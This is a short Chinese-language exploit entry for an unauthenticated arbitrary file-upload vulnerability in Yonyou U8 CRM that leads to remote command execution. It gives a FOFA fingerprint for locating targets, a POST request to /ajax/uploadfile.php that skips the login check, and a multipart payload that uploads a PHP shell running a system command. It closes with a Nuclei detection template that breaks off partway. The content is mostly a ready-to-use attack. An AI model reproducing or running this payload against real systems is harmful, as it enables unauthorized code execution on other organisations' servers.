# 用友U8CRMuploadfile文件上传致RCE漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="用友U8CRM"`
- **请求**：`POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: multipart/form-data;boundary=----269520967239406871642430066…`

**请求体 / payload**
```
------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="1.php "
Content-Type: application/octet-stream
<?php system("whoami");unlink(__FILE__);?>
------269520967239406871642430066855
Content-Disposition: form-data; name="upload"
upload
------269520967239406871642430066855--
```

**其他**
- Nuclei: | id: yonyou-crm-arbitrary-file-upload<br/>info:<br/>  name: Yonyou CRM - Arbitrary File Upload<br/>  author: HK<br/>  severity: high<br/>  description: 用友CRM系统的uploadfile.php接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件。<br/>  metadata:<br/>    fofa-query: app="用友U8CRM"<br/>  tags: yonyou,crm,fileupload<br/>http:<br/>  - raw:<br/>    - |<br/>      POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1<br/